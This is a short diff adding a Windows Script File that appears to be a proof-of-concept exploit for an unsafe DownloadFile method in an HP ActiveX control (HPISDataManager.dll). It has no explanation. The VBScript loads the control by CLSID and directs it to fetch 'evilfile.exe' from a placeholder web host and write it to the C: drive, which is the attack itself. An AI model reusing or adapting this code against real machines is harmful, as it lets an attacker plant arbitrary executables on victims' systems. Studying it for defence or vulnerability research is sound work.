@@ -1,0 +1,19 @@
+<?XML version='1.0' standalone='yes' ?>
+<package>
+<job id='DoneInVBS' debug='false' error='true'>
+	<object classid='clsid:14C1B87C-3342-445F-9B5E-365FF330A3AC' id='target' />
+	<script language='vbscript'>
+		'for debugging/custom prolog
+		targetFile = "C:\WINDOWS\Downloaded Program Files\HPISDataManager.dll"
+		prototype = "Sub DownloadFile ( ByVal bstrURL As String , ByVal bstrOutputFile As String , ByVal
+					bstrErrorOutputFile As String )"
+		memberName = "DownloadFile"
+		progid = "HPISDataManagerLib.Datamgr"
+		argCount = 3
+		arg1="http://www.example.com/evilfile.exe"
+		arg2="c:\evilfile.exe"
+		arg3="c:\log.xml"
+		target.DownloadFile arg1 ,arg2 ,arg3
+	</script>
+</job>
+</package>
